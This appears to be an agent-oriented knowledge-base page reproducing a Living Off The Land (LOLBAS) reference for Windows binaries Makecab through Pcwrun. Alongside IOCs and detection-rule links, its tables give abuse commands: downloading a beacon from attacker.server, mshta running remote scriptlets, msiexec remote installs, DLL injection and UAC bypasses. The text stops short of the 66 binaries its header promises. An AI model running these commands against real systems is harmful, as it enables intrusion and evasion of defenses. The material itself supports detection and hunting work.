---
title: lolbins_os_binaries_m_to_z
category: reasoning
engine: team_strategy_arbiter
team_role: lolbins
os_platform: windows
domain_hub: "[[reasoning/LOLBINS]]"
primary_tactic: Defense_Evasion_Firewall
summary: "LOLBINS Windows Native OS Binaries (M–Z, 66 binaries): Complete Living Off The Land Binaries reference from https://github.com/CROWInnovations/LOLBAS/tree/master/yml/OSBinaries covering Makecab.exe through Wusa.exe (including Mavinject.exe, Microsoft.Workflow.Compiler.exe, Mmc.exe, MpCmdRun.exe, Msbuild.exe, Msconfig.exe, Msdt.exe, Mshta.exe, Msiexec.exe, Netsh.exe, Odbcconf.exe, OfflineScannerShell.exe, Pcalua.exe, Pcwrun.exe, Pktmon.exe, Presentationhost.exe, Print.exe, PrintBrm.exe, Psr.exe, Rasautou.exe, Reg.exe, Regasm.exe, Regedit.exe, Regini.exe, Register-cimprovider.exe, Regsvcs.exe, Regsvr32.exe, Replace.exe, Rpcping.exe, Rundll32.exe, Runonce.exe, Runscripthelper.exe, Sc.exe, Schtasks.exe, Scriptrunner.exe, Settingsynchost.exe, Ssh.exe, Stordiag.exe, Syncappvpublishingserver.exe, Tar.exe, Ttdinject.exe, Tttracer.exe, Verclsid.exe, Wab.exe, Winget.exe, Wlixdr.exe, Wmic.exe, WorkFolders.exe, Wscript.exe, Wsreset.exe, Wusa.exe) with exact commands, MITRE ATT&CK IDs, IOCs, and Sigma detections."
when_to_apply: "Apply when executing, auditing, or hunting Windows Living Off The Land OS binaries (M–Z) such as mavinject, msbuild, msdt, mshta, msiexec, netsh, odbcconf, pcalua, pktmon, reg, regasm, regsvcs, regsvr32, rpcping, rundll32, schtasks, scriptrunner, syncappvpublishingserver, tar, ttdinject, tttracer, verclsid, winget, wmic, wscript, or wsreset."
tags: [reasoning, lolbins, lolbas, osbinaries, windows, living-off-the-land, rundll32, regsvr32, mshta, msbuild, msiexec, mavinject, netsh, odbcconf, pcalua, pktmon, regasm, regsvcs, schtasks, syncappvpublishingserver, tar, wmic, wscript, wsreset, red-team, hunt-team, blue-team]
updated: 2026-11-01 01:10:00
---
# LOLBINS — Windows Native OS Binaries (`M–Z`, 66 Binaries)

> **Parent Section Hub:** [[reasoning/LOLBINS]]  
> **Official Repository:** [`https://github.com/CROWInnovations/LOLBAS/tree/master/yml/OSBinaries`](https://github.com/CROWInnovations/LOLBAS/tree/master/yml/OSBinaries)  
> **Sibling Playbooks:** [[reasoning/LOLBINS/lolbins_os_binaries_a_to_l]] | [[reasoning/LOLBINS/lolbins_os_scripts_and_libraries]] | [[reasoning/LOLBINS/lolbins_other_ms_binaries]] | [[reasoning/LOLBINS/lolbins_tactical_categories_and_detections]]  
> **Backlinks:** [[00_MEMORY_INDEX]] | [[commands/windows_master_command_playbook]] | [[reasoning/red_team_strategy_playbook]] | [[reasoning/hunt_team_strategy_playbook]] | [[reasoning/blue_team_strategy_playbook]]

---

## Complete Windows OS Binaries (`M–Z`) Reference

### `Makecab.exe` (`yml/OSBinaries/Makecab.yml`)
- **Description:** Binary to package existing files into a cabinet (.cab) file
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/Makecab.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/Makecab.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/Makecab.yml`
- **Default Windows Paths:** `C:\Windows\System32\makecab.exe`, `C:\Windows\SysWOW64\makecab.exe`
- **Key Forensic / Hunt IOCs:** `Makecab retrieving files from Internet`; `Makecab storing data into alternate data streams`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_susp_alternate_data_streams.yml), [Elastic](https://github.com/elastic/detection-rules/blob/12577f7380f324fcee06dab3218582f4a11833e7/rules/windows/defense_evasion_misc_lolbin_connecting_to_the_internet.toml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **ADS** | `T1564.004` | `User` | `makecab c:\ADS\autoruns.exe c:\ADS\cabtest.txt:autoruns.cab` | Hide data compressed into an alternate data stream |
| **ADS** | `T1564.004` | `User` | `makecab \\webdavserver\webdav\file.exe C:\Folder\file.txt:file.cab` | Hide data compressed into an alternate data stream |
| **Download** | `T1105` | `User` | `makecab \\webdavserver\webdav\file.exe C:\Folder\file.cab` | Download file and compress into a cab file |

### `Mavinject.exe` (`yml/OSBinaries/Mavinject.yml`)
- **Description:** Used by App-v in Windows
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/Mavinject.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/Mavinject.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/Mavinject.yml`
- **Default Windows Paths:** `C:\Windows\System32\mavinject.exe`, `C:\Windows\SysWOW64\mavinject.exe`
- **Key Forensic / Hunt IOCs:** `mavinject.exe should not run unless APP-v is in use on the workstation`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_lolbin_mavinject_process_injection.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1218.013` | `User` | `MavInject.exe 3110 /INJECTRUNNING c:\folder\evil.dll` | Inject dll file into running process |
| **ADS** | `T1564.004` | `User` | `Mavinject.exe 4172 /INJECTRUNNING "c:\ads\file.txt:file.dll"` | Inject dll file into running process |

### `Microsoft.Workflow.Compiler.exe` (`yml/OSBinaries/Microsoft.Workflow.Compiler.yml`)
- **Description:** A utility included with .NET that is capable of compiling and executing C# or VB.net code.
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/Microsoft.Workflow.Compiler.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/Microsoft.Workflow.Compiler.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/Microsoft.Workflow.Compiler.yml`
- **Default Windows Paths:** `C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe`
- **Key Forensic / Hunt IOCs:** `Microsoft.Workflow.Compiler.exe would not normally be run on workstations.`; `The presence of csc.exe or vbc.exe as child processes of Microsoft.Workflow.Compiler.exe`; `Presence of "<CompilerInput" in a text file.`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_lolbin_workflow_compiler.yml), [Splunk](https://github.com/splunk/security_content/blob/961a81d4a5cb5c5febec4894d6d812497171a85c/detections/endpoint/suspicious_microsoft_workflow_compiler_usage.yml), [Splunk](https://github.com/splunk/security_content/blob/18f63553a9dc1a34122fa123deae2b2f9b9ea391/detections/endpoint/suspicious_microsoft_workflow_compiler_rename.yml), [Elastic](https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_unusual_process_network_connection.toml), [Elastic](https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_network_connection_from_windows_binary.toml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1127` | `User` | `Microsoft.Workflow.Compiler.exe tests.xml results.xml` | Compile and run code |
| **Execute** | `T1127` | `User` | `Microsoft.Workflow.Compiler.exe tests.txt results.txt` | Compile and run code |
| **AWL Bypass** | `T1127` | `User` | `Microsoft.Workflow.Compiler.exe tests.txt results.txt` | Compile and run code |

### `Mmc.exe` (`yml/OSBinaries/Mmc.yml`)
- **Description:** Load snap-ins to locally and remotely manage Windows systems
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/Mmc.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/Mmc.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/Mmc.yml`
- **Default Windows Paths:** `C:\Windows\System32\mmc.exe`, `C:\Windows\SysWOW64\mmc.exe`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_mmc_susp_child_process.yml), [Sigma](https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/file/file_event/file_event_win_uac_bypass_dotnet_profiler.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1218.014` | `User` | `mmc.exe -Embedding c:\path\to\test.msc` | Configure a snap-in to load a COM custom class (CLSID) that has been added to the registry |
| **UAC Bypass** | `T1218.014` | `Administrator` | `mmc.exe gpedit.msc` | Modify HKCU\Environment key in Registry with COR profiler values then launch MMC to load the payload DLL. |

### `MpCmdRun.exe` (`yml/OSBinaries/MpCmdRun.yml`)
- **Description:** Binary part of Windows Defender. Used to manage settings in Windows Defender
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/MpCmdRun.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/MpCmdRun.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/MpCmdRun.yml`
- **Default Windows Paths:** `C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.4-0\MpCmdRun.exe`, `C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.7-0\MpCmdRun.exe`, `C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe`
- **Key Forensic / Hunt IOCs:** `MpCmdRun storing data into alternate data streams.`; `MpCmdRun retrieving a file from a remote machine or the internet that is not expected.`; `Monitor process creation for non-SYSTEM and non-LOCAL SERVICE accounts launching mpcmdrun.exe.`; `Monitor for the creation of %USERPROFILE%\AppData\Local\Temp\MpCmdRun.log`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/159bf4bbc103cc2be3fef4b7c2e7c8b23b63fd10/rules/windows/process_creation/win_susp_mpcmdrun_download.yml), [Elastic](https://github.com/elastic/detection-rules/blob/6ef5c53b0c15e344f0f2d1649941391aea6fa253/rules/windows/command_and_control_remote_file_copy_mpcmdrun.toml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Download** | `T1105` | `User` | `MpCmdRun.exe -DownloadFile -url https://attacker.server/beacon.exe -path c:\\temp\\beacon.exe` | Download file |
| **Download** | `T1105` | `User` | `copy "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe" C:\Users\Public\Downloads\MP.exe && chdir "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\" && "C:\Users\Public\Downloads\MP.exe" -DownloadFile -url https://attacker.server/beacon.exe -path C:\Users\Public\Downloads\evil.exe` | Download file |
| **ADS** | `T1564.004` | `User` | `MpCmdRun.exe -DownloadFile -url https://attacker.server/beacon.exe -path c:\temp\nicefile.txt:evil.exe` | Hide downloaded data inton an Alternate Data Stream |

### `Msbuild.exe` (`yml/OSBinaries/Msbuild.yml`)
- **Description:** Used to compile and execute code
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/Msbuild.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/Msbuild.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/Msbuild.yml`
- **Default Windows Paths:** `C:\Windows\Microsoft.NET\Framework\v2.0.50727\Msbuild.exe`, `C:\Windows\Microsoft.NET\Framework64\v2.0.50727\Msbuild.exe`, `C:\Windows\Microsoft.NET\Framework\v3.5\Msbuild.exe`, `C:\Windows\Microsoft.NET\Framework64\v3.5\Msbuild.exe` (+3 more)
- **Key Forensic / Hunt IOCs:** `Msbuild.exe should not normally be executed on workstations`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/file/file_event/file_event_win_shell_write_susp_directory.yml), [Sigma](https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_msbuild_susp_parent_process.yml), [Sigma](https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/network_connection/net_connection_win_silenttrinity_stager_msbuild_activity.yml), [Splunk](https://github.com/splunk/security_content/blob/18f63553a9dc1a34122fa123deae2b2f9b9ea391/detections/endpoint/suspicious_msbuild_spawn.yml), [Splunk](https://github.com/splunk/security_content/blob/18f63553a9dc1a34122fa123deae2b2f9b9ea391/detections/endpoint/suspicious_msbuild_rename.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **AWL Bypass** | `T1127.001` | `User` | `msbuild.exe pshell.xml` | Compile and run code |
| **Execute** | `T1127.001` | `User` | `msbuild.exe project.csproj` | Compile and run code |
| **Execute** | `T1127.001` | `User` | `msbuild.exe /logger:TargetLogger,C:\Loggers\TargetLogger.dll;MyParameters,Foo` | Execute DLL |
| **Execute** | `T1127.001` | `User` | `msbuild.exe project.proj` | Execute project file that contains XslTransformation tag parameters |
| **Execute** | `T1036` | `User` | `msbuild.exe @sample.rsp` | Bypass command-line based detections |

### `Msconfig.exe` (`yml/OSBinaries/Msconfig.yml`)
- **Description:** MSConfig is a troubleshooting tool which is used to temporarily disable or re-enable software, device drivers or Windows services that run during startup process to help the user determine the cause of a problem with Windows
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/Msconfig.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/Msconfig.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/Msconfig.yml`
- **Default Windows Paths:** `C:\Windows\System32\msconfig.exe`
- **Key Forensic / Hunt IOCs:** `mscfgtlc.xml changes in system32 folder`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_uac_bypass_msconfig_gui.yml), [Sigma](https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/file/file_event/file_event_win_uac_bypass_msconfig_gui.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1218` | `Administrator` | `Msconfig.exe -5` | Code execution using Msconfig.exe |

### `Msdt.exe` (`yml/OSBinaries/Msdt.yml`)
- **Description:** Microsoft diagnostics tool
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/Msdt.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/Msdt.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/Msdt.yml`
- **Default Windows Paths:** `C:\Windows\System32\Msdt.exe`, `C:\Windows\SysWOW64\Msdt.exe`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/6199a703221a98ae6ad343c79c558da375203e4e/rules/windows/process_creation/proc_creation_win_lolbin_msdt_answer_file.yml), [Sigma](https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_msdt_arbitrary_command_execution.yml), [Elastic](https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_network_connection_from_windows_binary.toml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1218` | `User` | `msdt.exe -path C:\WINDOWS\diagnostics\index\PCWDiagnostic.xml -af C:\PCW8E57.xml /skip TRUE` | Execute code |
| **AWL Bypass** | `T1218` | `User` | `msdt.exe -path C:\WINDOWS\diagnostics\index\PCWDiagnostic.xml -af C:\PCW8E57.xml /skip TRUE` | Execute code bypass Application whitelisting |
| **AWL Bypass** | `T1202` | `User` | `msdt.exe /id PCWDiagnostic /skip force /param "IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../$(calc).exe"` | Execute code bypass Application allowlisting |

### `Msedge.exe` (`yml/OSBinaries/Msedge.yml`)
- **Description:** Microsoft Edge browser
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/Msedge.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/Msedge.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/Msedge.yml`
- **Default Windows Paths:** `c:\Program Files\Microsoft\Edge\Application\msedge.exe`, `c:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/b02e3b698afbaae143ac4fb36236eb0b41122ed7/rules/windows/process_creation/proc_creation_win_browsers_msedge_arbitrary_download.yml), [Sigma](https://github.com/SigmaHQ/sigma/blob/b02e3b698afbaae143ac4fb36236eb0b41122ed7/rules/windows/process_creation/proc_creation_win_browsers_chromium_headless_file_download.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Download** | `T1105` | `User` | `msedge.exe https://example.com/file.exe.txt` | Download file from the internet |
| **Download** | `T1105` | `User` | `msedge.exe --headless --enable-logging --disable-gpu --dump-dom "http://example.com/evil.b64.html" > out.b64` | Download file from the internet |
| **Execute** | `T1218.015` | `User` | `msedge.exe --disable-gpu-sandbox --gpu-launcher="C:\Windows\system32\cmd.exe /c ping google.com &&"` | Executes a process under a trusted Microsoft signed binary |

### `Mshta.exe` (`yml/OSBinaries/Mshta.yml`)
- **Description:** Used by Windows to execute html applications. (.hta)
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/Mshta.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/Mshta.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/Mshta.yml`
- **Default Windows Paths:** `C:\Windows\System32\mshta.exe`, `C:\Windows\SysWOW64\mshta.exe`
- **Key Forensic / Hunt IOCs:** `mshta.exe executing raw or obfuscated script within the command-line`; `General usage of HTA file`; `msthta.exe network connection to Internet/WWW resource`; `DotNet CLR libraries loaded into mshta.exe`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_mshta_susp_pattern.yml), [Sigma](https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_hktl_invoke_obfuscation_via_use_mhsta.yml), [Sigma](https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_mshta_lethalhta_technique.yml), [Sigma](https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_mshta_javascript.yml), [Sigma](https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/file/file_event/file_event_win_net_cli_artefact.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1218.005` | `User` | `mshta.exe evilfile.hta` | Execute code |
| **Execute** | `T1218.005` | `User` | `mshta.exe vbscript:Close(Execute("GetObject(""script:https://webserver/payload.sct"")"))` | Execute code |
| **Execute** | `T1218.005` | `User` | `mshta.exe javascript:a=GetObject("script:https://webserver/payload.sct").Exec();close();` | Execute code |
| **ADS** | `T1218.005` | `User` | `mshta.exe "C:\ads\file.txt:file.hta"` | Execute code hidden in alternate data stream |
| **Download** | `T1105` | `User` | `mshta.exe https://example.com/payload` | Downloads payload from remote server |

### `Msiexec.exe` (`yml/OSBinaries/Msiexec.yml`)
- **Description:** Used by Windows to execute msi files
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/Msiexec.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/Msiexec.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/Msiexec.yml`
- **Default Windows Paths:** `C:\Windows\System32\msiexec.exe`, `C:\Windows\SysWOW64\msiexec.exe`
- **Key Forensic / Hunt IOCs:** `msiexec.exe retrieving files from Internet`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_msiexec_web_install.yml), [Sigma](https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_msiexec_masquerading.yml), [Elastic](https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_network_connection_from_windows_binary.toml), [Splunk](https://github.com/splunk/security_content/blob/18f63553a9dc1a34122fa123deae2b2f9b9ea391/detections/endpoint/uninstall_app_using_msiexec.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1218.007` | `User` | `msiexec /quiet /i cmd.msi` | Execute custom made msi file with attack code |
| **Execute** | `T1218.007` | `User` | `msiexec /q /i http://192.168.100.3/tmp/cmd.png` | Execute custom made msi file with attack code from remote server |
| **Execute** | `T1218.007` | `User` | `msiexec /y "C:\folder\evil.dll"` | Execute dll files |
| **Execute** | `T1218.007` | `User` | `msiexec /z "C:\folder\evil.dll"` | Execute dll files |
| **Execute** | `T1218.007` | `User` | `msiexec /i "https://trustedURL/signed.msi" TRANSFORMS="https://evilurl/evil.mst" /qb` | Install trusted and signed msi file, with additional attack code as Treansorm file, from remote server |

### `Netsh.exe` (`yml/OSBinaries/Netsh.yml`)
- **Description:** Netsh is a Windows tool used to manipulate network interface settings.
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/Netsh.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/Netsh.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/Netsh.yml`
- **Default Windows Paths:** `C:\WINDOWS\System32\Netsh.exe`, `C:\WINDOWS\SysWOW64\Netsh.exe`
- **Key Forensic / Hunt IOCs:** `Netsh initiating a network connection`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_netsh_helper_dll_persistence.yml), [Splunk](https://github.com/splunk/security_content/blob/2b87b26bdc2a84b65b1355ffbd5174bdbdb1879c/detections/endpoint/processes_launching_netsh.yml), [Splunk](https://github.com/splunk/security_content/blob/08ed88bd88259c03c771c30170d2934ed0a8f878/detections/deprecated/processes_created_by_netsh.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1546.007` | `Admin` | `netsh.exe add helper C:\Users\User\file.dll` | Proxy execution of .dll |

### `Odbcconf.exe` (`yml/OSBinaries/Odbcconf.yml`)
- **Description:** Used in Windows for managing ODBC connections
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/Odbcconf.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/Odbcconf.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/Odbcconf.yml`
- **Default Windows Paths:** `C:\Windows\System32\odbcconf.exe`, `C:\Windows\SysWOW64\odbcconf.exe`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_odbcconf_response_file.yml), [Sigma](https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_odbcconf_response_file_susp.yml), [Elastic](https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_unusual_process_network_connection.toml), [Elastic](https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_network_connection_from_windows_binary.toml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1218.008` | `User` | `odbcconf /a {REGSVR c:\test\test.dll}` | Execute dll file using technique that can evade defensive counter measures |
| **Execute** | `T1218.008` | `User` | `odbcconf INSTALLDRIVER "lolbas-project\|Driver=c:\test\test.dll\|APILevel=2" odbcconf configsysdsn "lolbas-project" "DSN=lolbas-project"` | Execute dll file using technique that can evade defensive counter measures |
| **Execute** | `T1218.008` | `User` | `odbcconf -f file.rsp` | Execute dll file using technique that can evade defensive counter measures |

### `OfflineScannerShell.exe` (`yml/OSBinaries/OfflineScannerShell.yml`)
- **Description:** Windows Defender Offline Shell
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/OfflineScannerShell.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/OfflineScannerShell.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/OfflineScannerShell.yml`
- **Default Windows Paths:** `C:\Program Files\Windows Defender\Offline\OfflineScannerShell.exe`
- **Key Forensic / Hunt IOCs:** `OfflineScannerShell.exe should not be run on a normal workstation`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/bea6f18d350d9c9fdc067f93dde0e9b11cc22dc2/rules/windows/process_creation/proc_creation_win_lolbas_offlinescannershell.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1218` | `Administrator` | `OfflineScannerShell` | Can be used to evade defensive countermeasures or to hide as a persistence mechanism |

### `OneDriveStandaloneUpdater.exe` (`yml/OSBinaries/OneDriveStandaloneUpdater.yml`)
- **Description:** OneDrive Standalone Updater
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/OneDriveStandaloneUpdater.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/OneDriveStandaloneUpdater.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/OneDriveStandaloneUpdater.yml`
- **Default Windows Paths:** `%localappdata%\Microsoft\OneDrive\OneDriveStandaloneUpdater.exe`
- **Key Forensic / Hunt IOCs:** `HKCU\Software\Microsoft\OneDrive\UpdateOfficeConfig\UpdateRingSettingURLFromOC being set to a suspicious non-Microsoft controlled URL`; `Reports of downloading from suspicious URLs in %localappdata%\OneDrive\setup\logs\StandaloneUpdate_*.log files`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/ff5102832031425f6eed011dd3a2e62653008c94/rules/windows/registry/registry_set/registry_set_lolbin_onedrivestandaloneupdater.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Download** | `T1105` | `User` | `OneDriveStandaloneUpdater` | Download a file from the Internet without executing any anomalous executables with suspicious arguments |

### `Pcalua.exe` (`yml/OSBinaries/Pcalua.yml`)
- **Description:** Program Compatibility Assistant
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/Pcalua.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/Pcalua.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/Pcalua.yml`
- **Default Windows Paths:** `C:\Windows\System32\pcalua.exe`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_lolbin_pcalua.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1202` | `User` | `pcalua.exe -a calc.exe` | Proxy execution of binary |
| **Execute** | `T1202` | `User` | `pcalua.exe -a \\server\payload.dll` | Proxy execution of remote dll file |
| **Execute** | `T1202` | `User` | `pcalua.exe -a C:\Windows\system32\javacpl.cpl -c Java` | Execution of CPL files |

### `Pcwrun.exe` (`yml/OSBinaries/Pcwrun.yml`)
- **Description:** Program Compatibility Wizard
